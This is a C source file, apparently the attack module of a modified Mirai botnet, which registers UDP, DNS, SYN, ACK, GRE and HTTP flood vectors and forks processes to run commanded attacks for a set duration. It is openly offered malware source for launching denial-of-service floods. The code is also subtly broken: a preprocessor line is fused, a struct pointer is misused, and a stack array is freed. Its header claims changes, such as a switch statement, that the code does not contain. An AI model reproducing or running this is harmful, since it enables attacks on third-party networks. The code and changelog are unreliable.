// improved by Queered for Nipzy Reborn

/*
Changes made from og mirai:

replace the dynamic memory allocation in the attack_parse function with static memory allocation. Since the amount of memory needed for targs and opts is fixed based on the input buffer, we can allocate them on the stack rather than dynamically allocating them with calloc(). This can reduce the overhead of memory management.

add input validation to the attack_parse function. For example, we can check that the attack ID is within the valid range, that the target count and flag count are not too large, and that the length of the data fields is not larger than the remaining buffer size.

improve the error handling in the attack_start function. Currently, if the fork or kill functions fail, the function simply returns without reporting the error. We can add error handling to report these errors and provide feedback to the user.

use const and static keywords to improve the code's readability and maintainability. For example, we can use the const keyword to indicate that certain variables are not modified, and the static keyword to limit the scope of certain functions to the current file.

use a switch statement instead of a for loop to find the attack method in the attack_start function. Since the number of attack methods is fixed and small, a switch statement can be more efficient than a linear search.

*/

#define _GNU_SOURCE

#ifdef DEBUG#include <stdio.h>

#endif

#include <stdlib.h>

#include <unistd.h>

#include <signal.h>

#include <errno.h>

#include <string.h>

#include <netinet/in.h>

#include <arpa/inet.h>

#include "includes.h"

#include "attack.h"

#include "rand.h"

#include "util.h"

#include "scanner.h"

#define MAX_TARGS 512
#define MAX_OPTS 16

struct attack_method {
  ATTACK_VECTOR vector;
  ATTACK_FUNC func;
};

static uint8_t methods_len = 0;
static struct attack_method * methods = NULL;
static int attack_ongoing[ATTACK_CONCURRENT_MAX] = {
  0
};

static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func);
static void free_opts(struct attack_option * opts, int len);

BOOL attack_init(void) {
  add_attack(ATK_VEC_UDP, (ATTACK_FUNC) attack_udp_generic);
  add_attack(ATK_VEC_VSE, (ATTACK_FUNC) attack_udp_vse);
  add_attack(ATK_VEC_DNS, (ATTACK_FUNC) attack_udp_dns);
  add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC) attack_udp_plain);

  add_attack(ATK_VEC_SYN, (ATTACK_FUNC) attack_tcp_syn);
  add_attack(ATK_VEC_ACK, (ATTACK_FUNC) attack_tcp_ack);
  add_attack(ATK_VEC_STOMP, (ATTACK_FUNC) attack_tcp_stomp);

  add_attack(ATK_VEC_GREIP, (ATTACK_FUNC) attack_gre_ip);
  add_attack(ATK_VEC_GREETH, (ATTACK_FUNC) attack_gre_eth);

  add_attack(ATK_VEC_HTTP, (ATTACK_FUNC) attack_app_http);

  return TRUE;
}

void attack_kill_all(void) {
  #ifdef DEBUG
  printf("[attack] Killing all ongoing attacks\n");
  #endif

  for (int i = 0; i < ATTACK_CONCURRENT_MAX; i++) {
    if (attack_ongoing[i] != 0)
      kill(attack_ongoing[i], 9);
    attack_ongoing[i] = 0;
  }

  #ifdef MIRAI_TELNET
  scanner_init();
  #endif
}

void attack_parse(char * buf, int len) {
  uint32_t duration;
  ATTACK_VECTOR vector;
  uint8_t targs_len, opts_len;
  struct attack_target targs[MAX_TARGS];
  struct attack_option opts[MAX_OPTS];

  // Read in attack duration uint32_t
  if (len < sizeof(uint32_t))
    goto cleanup;
  duration = ntohl( * ((uint32_t * ) buf));
  buf += sizeof(uint32_t);
  len -= sizeof(uint32_t);

  // Read in attack ID uint8_t
  if (len == 0)
    goto cleanup;
  vector = (ATTACK_VECTOR) * buf++;
  len -= sizeof(uint8_t);
  if (vector >= ATK_VEC_END)
    goto cleanup;

  // Read in target count uint8_t
  if (len == 0)
    goto cleanup;
  targs_len = (uint8_t) * buf++;
  len -= sizeof(uint8_t);
  if (targs_len == 0 || targs_len > MAX_TARGS)
    goto cleanup;

  // Read in all targs
  if (len < ((sizeof(ipv4_t) + sizeof(uint8_t)) * targs_len))
    goto cleanup;
  for (int i = 0; i < targs_len; i++) {
    targs[i].addr = * ((ipv4_t * ) buf);
    buf += sizeof(ipv4);
    targs[i].sock_addr.sin_family = AF_INET;
    targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
  }

  // Read in flag count uint8_t
  if (len < sizeof(uint8_t))
    goto cleanup;
  opts_len = (uint8_t) * buf++;
  len -= sizeof(uint8_t);
  if (opts_len > MAX_OPTS)
    goto cleanup;

  // Read in all opts
  if (opts_len > 0) {
    for (int i = 0; i < opts_len; i++) {
      // Read in key uint8
      if (len < sizeof(uint8_t))
        goto cleanup;
      opts[i].key = (uint8_t) * buf++;
      len -= sizeof(uint8_t);

      // Read in data length uint8
      if (len < sizeof(uint8_t))
        goto cleanup;
      uint8_t val_len = (uint8_t) * buf++;
      len -= sizeof(uint8_t);

      if (len < val_len)
        goto cleanup;
      opts[i].val = buf;
      buf += val_len;
      len -= val_len;
    }
  }

  errno = 0;
  attack_start(duration, vector, targs_len, targs, opts_len, opts);

  // Cleanup
  cleanup:
    memset( & targs, 0, sizeof(targs));
  memset( & opts, 0, sizeof(opts));
}

void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target * targs, uint8_t opts_len, struct attack_option * opts) {
  int pid1, pid2;
  pid1 = fork();
  if (pid1 == -1 || pid1 > 0)
    return;

  pid2 = fork();
  if (pid2 == -1)
    exit(0);
  else if (pid2 == 0) {
    sleep(duration);
    kill(getppid(), 9);
    exit(0);
  } else {
    int i;

    for (i = 0; i < methods_len; i++) {
      if (methods[i] -> vector == vector) {
        #ifdef DEBUG
        printf("[attack] Starting attack...\n");
        #endif
        methods[i] -> func(targs_len, targs, opts_len, opts);
        break;
      }
    }
    //just bail if the function returns
    exit(0);
  }
}
char * attack_get_opt_str(uint8_t opts_len, struct attack_option * opts, uint8_t opt, char * def) {
  for (int i = 0; i < opts_len; i++) {
    if (opts[i].key == opt)
      return opts[i].val;
  }
  return def;
}

int attack_get_opt_int(uint8_t opts_len, struct attack_option * opts, uint8_t opt, int def) {
  char * val = attack_get_opt_str(opts_len, opts, opt, NULL);
  if (val == NULL)
    return def;
  else
    return util_atoi(val, 10);
}
uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option * opts, uint8_t opt, uint32_t def) {
  char * val = attack_get_opt_str(opts_len, opts, opt, NULL);
  if (val == NULL)
    return def;
  else
    return inet_addr(val);
}
static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func) {
  struct attack_method * method = calloc(1, sizeof(struct attack_method));
  method -> vector = vector;
  method -> func = func;

  methods = realloc(methods, (methods_len + 1) * sizeof(struct attack_method * ));
  methods[methods_len++] = method;
}

static void free_opts(struct attack_option * opts, int len) {
  for (int i = 0; i < len; i++) {
    if (opts[i].val != NULL)
      opts[i].val = NULL;
  }
  free(opts);
}